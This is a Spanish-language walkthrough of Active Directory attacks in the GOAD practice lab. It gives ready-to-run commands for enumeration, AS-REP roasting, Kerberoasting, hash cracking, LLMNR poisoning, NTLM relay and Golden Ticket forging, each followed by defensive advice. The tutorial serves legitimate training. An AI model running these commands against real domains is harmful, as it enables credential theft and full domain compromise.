# Guía de Ataques en Active Directory

Esta guía documenta ataques contra Active Directory utilizando el laboratorio **Game of Active Directory** de Mayfly. Se incluyen pasos detallados de ejecución, contexto sobre por qué los ataques son posibles y mejores prácticas para reproducirlos de manera controlada.

## 1. Fase de Reconocimiento

### 1.1 Escaneo de Red y Servicios
Antes de cualquier ataque, es crucial identificar los servicios expuestos en la red.

```bash
nmap -Pn -p- -sC -sV -oA full_scan_goad 192.168.56.10-12,22-23
```

**Explicación:**
- `-Pn`: Ignora la falta de respuesta de ping.
- `-p-`: Escanea todos los puertos.
- `-sC`: Usa scripts de reconocimiento por defecto.
- `-sV`: Identifica versiones de servicios.

Este paso ayuda a identificar servicios clave como SMB, LDAP y Kerberos.

### 1.2 Enumeración de Usuarios
Para descubrir usuarios en el dominio, se pueden utilizar múltiples herramientas:

```bash
netexec smb 192.168.46.10-22 --users --continue-on-success
```

También con `rpcclient`:

```bash
rpcclient -U "" -N 192.168.46.11 -c "enumdomusers"
```

**Por qué esto funciona:** Algunos servidores permiten la enumeración anónima de usuarios debido a configuraciones débiles de permisos.

---

## 2. Ataques Basados en Kerberos

### 2.1 AS-REP Roasting
Este ataque se dirige a cuentas sin pre-autenticación Kerberos.

```bash
GetNPUsers.py north.sevenkingdoms.local/ -no-pass -usersfile users.txt
```

**Cómo funciona:**
- Busca cuentas con la opción `UF_DONT_REQUIRE_PREAUTH` activada.
- Obtiene un hash AS-REP que puede ser crackeado offline.

Para descifrar el hash:

```bash
hashcat -m 18200 asrephash /usr/share/wordlists/rockyou.txt
```

**Medidas defensivas:**
- Requerir pre-autenticación en todas las cuentas.
- Implementar autenticación multifactor.

### 2.2 Kerberoasting
Este ataque abusa de los **Service Principal Names (SPN)** para obtener hashes de contraseñas de cuentas de servicio.

```bash
GetUserSPNs.py -request -dc-ip 192.168.46.11 north.sevenkingdoms.local/brandon.stark:iseedeadpeople -outputfile kerberoasting.hashes
```

Para crackear el hash:

```bash
hashcat -m 13100 -a 0 kerberoasting.hashes /usr/share/wordlists/rockyou.txt -O
```

**Medidas defensivas:**
- Usar contraseñas largas y complejas en cuentas de servicio.
- Monitorear solicitudes de tickets TGS sospechosas.

---

## 3. Abuso de ACLs y Privilegios

### 3.1 Enumeración con BloodHound

```bash
bloodhound-python --zip -c All -d north.sevenkingdoms.local -u jon.snow@north.sevenkingdoms.local -p iknownothing -ns 192.168.46.10 -dc north.sevenkingdoms.local
```

**Qué hace:**
- Recopila información de relaciones de privilegios en Active Directory.
- Permite visualizar rutas de escalamiento de privilegios.

**Defensa:**
- Limitar permisos innecesarios en cuentas y grupos.
- Monitorear consultas LDAP sospechosas.

---

## 4. Ataques de Relaying y Hashes

### 4.1 LLMNR Poisoning
Este ataque explota la resolución de nombres en la red local para capturar hashes NTLM.

```bash
sudo responder -I <interfaz>
```

Si capturamos un hash NTLMv2, lo crackeamos con:

```bash
hashcat -m 5500 --force -a 0 responder.hash /usr/share/wordlists/rockyou.txt
```

**Defensa:**
- Deshabilitar LLMNR y NetBIOS en todas las máquinas.
- Usar SMB Signing para evitar el relaying de NTLM.

### 4.2 NTLM Relay Attack
Este ataque permite redirigir autenticaciones NTLM capturadas hacia otro sistema.

```bash
ntlmrelayx.py -tf relay.txt -of netntlm -t NORTH\EDDARD.STARK@192.168.46.22 -smb2support -socks
```

**Defensa:**
- Implementar `LDAP Signing` y `SMB Signing` obligatorios.
- Monitorear autenticaciones NTLM inusuales.

---

## 5. Ataques Persistentes

### 5.1 Golden Ticket Attack
Este ataque permite crear TGTs falsos usando el hash del servicio `KRBTGT`.

```bash
ticketer.py -nthash <krbtgt-hash> -domain-sid <domain-sid> -domain SEVENKINGDOMS.LOCAL robert.baratheon
```

Después de generarlo, lo cargamos con:

```bash
export KRB5CCNAME=/home/kali/Documents/pt/ROBERT.BARATHEON.ccache
```

Finalmente, accedemos a una máquina objetivo:

```bash
wmiexec.py -k -dc-ip 192.168.46.10 -target-ip 192.168.46.10 -no-pass sevenkingdoms.local/robert.baratheon@kingslanding.sevenkingdoms.local
```

**Defensa:**
- Rotar la contraseña del usuario `KRBTGT` regularmente.
- Habilitar `Windows Defender Credential Guard`.